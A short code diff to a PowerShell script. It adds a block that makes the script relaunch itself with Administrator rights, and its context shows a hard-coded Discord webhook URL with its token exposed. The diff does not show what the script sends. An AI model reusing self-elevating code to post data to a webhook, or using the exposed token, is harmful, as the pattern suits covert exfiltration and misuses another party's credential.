@@ -1,3 +1,14 @@
+# Self-elevate PowerShell script
+If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    # Create a new process as administrator
+    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
+    $newProcess.Arguments = "-File `"" + $PSCommandPath + "`"";
+    $newProcess.Verb = "runAs";
+    [System.Diagnostics.Process]::Start($newProcess) | Out-Null
+    Exit
+}
+
 # Replace this with your Discord Webhook URL
 $webhookURL = "https://discord.com/api/webhooks/1302032038563414147/o5jjFWbs_6-_rTlE-BqdFf7Gayo5DkW8Cj2HXdpWr9eiOkfQv1N_iR-el8CvliJCNSMg"
 
